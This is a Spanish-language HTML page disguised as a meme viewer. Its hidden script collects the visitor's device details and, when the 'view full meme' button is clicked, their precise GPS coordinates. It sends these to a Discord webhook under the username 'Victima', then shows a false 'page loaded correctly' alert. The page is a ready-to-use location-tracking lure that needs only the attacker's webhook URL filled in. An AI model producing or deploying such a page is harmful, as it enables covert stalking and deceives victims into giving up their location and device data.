<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Meme</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      background: #000; 
      display: flex; 
      flex-direction: column;
      justify-content: center; 
      align-items: center; 
      min-height: 100vh;
      color: white;
      font-family: sans-serif;
    }
    img { max-width: 100%; height: auto; margin-bottom: 20px; }
    button {
      padding: 12px 24px;
      font-size: 16px;
      background: #5865F2;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <img src="https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif" alt="meme">
  <button id="btnVer">Ver meme completo</button>

  <script>
    const webhookUrl = 'TU_WEBHOOK_URL'; // Reemplaza con tu URL de Discord

    const datos = {
      dispositivo: navigator.userAgent,
      plataforma: navigator.platform,
      pantalla: screen.width + "x" + screen.height,
      idioma: navigator.language,
      hora: new Date().toString()
    };

    // La ubicación se activa al hacer clic en el botón (interacción requerida)
    document.getElementById('btnVer').addEventListener('click', () => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            datos.latitud = position.coords.latitude;
            datos.longitud = position.coords.longitude;
            datos.precision = position.coords.accuracy + " metros";
            enviar();
          },
          (error) => {
            datos.gps = "Denegado o Bloqueado (Código: " + error.code + ")";
            enviar();
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        datos.gps = "No soportado";
        enviar();
      }
    });

    function enviar() {
      const mensaje = {
        username: "Victima",
        content: "Nueva conexion!",
        embeds: [{
          title: "Datos del Dispositivo",
          color: 15158332,
          fields: [
            { name: "Hora", value: datos.hora },
            { name: "Dispositivo", value: datos.dispositivo.substring(0, 500) },
            { name: "Plataforma", value: datos.plataforma },
            { name: "Pantalla", value: datos.pantalla },
            { name: "Idioma", value: datos.idioma }
          ]
        }]
      };

      if (datos.latitud) {
        mensaje.embeds[0].fields.push(
          { name: "Latitud", value: datos.latitud.toString() },
          { name: "Longitud", value: datos.longitud.toString() },
          { name: "Mapa", value: "https://maps.google.com/?q=" + datos.latitud + "," + datos.longitud }
        );
      } else if (datos.gps) {
        mensaje.embeds[0].fields.push(
          { name: "GPS Estado", value: datos.gps }
        );
      }

      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(mensaje)
      }).then(() => {
        alert("¡Página cargada correctamente!");
      });
    }
  </script>
</body>
</html>
